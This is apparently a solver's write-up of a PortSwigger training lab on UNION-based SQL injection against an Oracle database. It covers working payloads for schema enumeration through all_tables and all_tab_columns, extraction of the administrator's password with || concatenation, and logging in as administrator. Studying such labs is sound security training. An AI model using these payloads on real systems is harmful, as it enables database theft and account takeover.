# PortSwigger Lab

## Lab

SQL injection attack, listing the database contents on Oracle

URL: https://0a4700350499937f800808d700b6005f.web-security-academy.net

## Vulnerability Class

SQL injection — UNION-based schema enumeration + credential extraction (Oracle dictionary views)

## Objective

Find the users table, determine its columns, extract the administrator's credentials, and log in as administrator.

## Relevant Application Behavior

- Same e-commerce family; injection point `GET /filter?category=<value>`.
- Errors → HTTP 500 (~2495 bytes); valid queries → 200 listing.
- Oracle backend: `UNION SELECT NULL,NULL FROM dual--` → 200 (Oracle signature from lab 3, freshly verified).
- Login at `POST /login` with `csrf`/`username`/`password` (token+cookie pairing, as in lab 2).

## Initial Observations

- Baseline `category=Gifts` → 200, 8621 bytes.
- `category=Gifts'` → 500 (interpolation confirmed).
- 2 columns confirmed via `UNION SELECT NULL,NULL FROM dual--` → 200 (+91 bytes).

## Hypotheses

- H1: Filter injection point with 2 rendered columns, `FROM dual` + `--` (Oracle instance — but verified fresh, not assumed, after lab 5's comment-style surprise).
- H2: `all_tables` lists the schema; a users-like table exists.
- H3: `all_tab_columns` reveals the users table's columns; concatenating them via `||` extracts credentials.

## Attempts

1. Baseline / quote / UNION2-dual → 200 (injection + 2 columns + Oracle syntax confirmed).
2. `UNION SELECT table_name,NULL FROM all_tables--` → found `USERS_AGWMAK` (also `APP_USERS_AND_ROLES`).
3. `UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_AGWMAK'--` → 200 but output interleaved among product tiles; initial scan missed it. Parsing the full text revealed: `USERNAME_QUPSPR`, `PASSWORD_VFUWPY`, `EMAIL`.
4. Guessed column names for extraction (`USERNAME_||...||_PASSWORD`-style guess) → 500 (wrong: real names have random suffixes).
5. `UNION SELECT USERNAME_QUPSPR || '~' || PASSWORD_VFUWPY,NULL FROM USERS_AGWMAK--` → extracted `administrator~p3g74b5bzogtmey9xbra`, plus carlos/wiener.
6. Logged in with administrator credentials (CSRF+cookie paired) → 302 → `/my-account?id=administrator` → "Your username is: administrator".

## What Failed

- First data-extraction attempt guessed column names (`USERNAME_`/`PASSWORD_`) → 500. Random-suffixed table/column names (a PortSwigger hardening measure) make guessing useless — always enumerate `all_tab_columns` first.
- Initial column-name response parsing (grep for h3/pipe markers) showed nothing: the injected rows render interleaved with product tiles, so narrow grep patterns miss them. Full-text parsing (or distinctive separators like `~`) is needed.

## What Worked

- Enumeration chain: `all_tables` → `all_tab_columns WHERE table_name='USERS_AGWMAK'` → `SELECT USERNAME_QUPSPR || '~' || PASSWORD_VFUWPY FROM USERS_AGWMAK`.
- Login with extracted credentials → administrator session.

## Root Cause

Unparameterized `category` input in a 2-column SELECT. Oracle's data dictionary (`all_tables`, `all_tab_columns`) is UNION-queryable through the listing UI, and the users table (with randomized identifiers) is fully extractable. The application then renders attacker rows in the product listing.

## Verification

- Each enumeration step returned 200 with sizes growing per additional injected rows (8712 → 17251 → 9039 → 9087).
- Credential row rendered `administrator~p3g74b5bzogtmey9xbra` — separator makes parsing unambiguous.
- Login produced a 302 to `/my-account?id=administrator`, page rendered "Your username is: administrator" with the session cookie; lab status `is-solved`.

## Impact

Full database content disclosure: schema enumeration (all tables), column discovery, and extraction of every user's plaintext credentials (administrator, carlos, wiener). Result: administrator account takeover. On a real system this is complete compromise of the application's data layer confidentiality.

## Why The Successful Approach Worked

- Instance-specific verification first (`FROM dual` accepted) pinpointed Oracle before choosing dictionary views — no wasted `information_schema` attempts.
- Oracle's `||` string concatenation merged two columns into the single rendered position with a `~` separator, making multi-column extraction visible and parseable.
- Freshly enumerated column names (with random suffixes) replaced guesswork; the 500 on the guessed name was the signal to enumerate rather than guess.

## Generalization

- Oracle enumeration chain (vs. non-Oracle): tables = `FROM all_tables`; columns = `FROM all_tab_columns WHERE table_name='<T>'`; data = `FROM <T>` (user tables accessed bare, dictionary views need no owner prefix here).
- PortSwigger-style randomized identifiers (USERS_AGWMAK, PASSWORD_VFUWPY) represent real-world obfuscation: enumerate metadata, never guess names.
- `|| '~' ||` concatenation is the Oracle analogue of MySQL `CONCAT(a,'~',b)` — a rendered-position workaround when the UI displays only one column.
- Injected rows interleave with legitimate content: use distinctive separators and full-document parsing rather than positional greps.

## Lessons Learned

- The UNION recipe's step order matters: column-count → rendered-position → **enumerate metadata** → extract data. Skipping enumeration (guessing names) costs a 500 and time.
- Oracle's dictionary is `all_*` (session-visible), not `information_schema`; `dual` is mandatory for literal SELECTs. Both were known from lab 3 and transferred cleanly once the backend was fingerprinted.
- Verification of each step by response-size delta (+91 for one injected row, +5400 for the table list) gives cheap progress signals without extra requests.

## Related Methodology

- methodology/injection.md (UNION-based extraction sequence; Oracle dictionary views)

## References

- Lab: https://portswigger.net/web-security/sql-injection/lab-listing-database-contents-oracle
- Solved instance: https://0a4700350499937f800808d700b6005f.web-security-academy.net
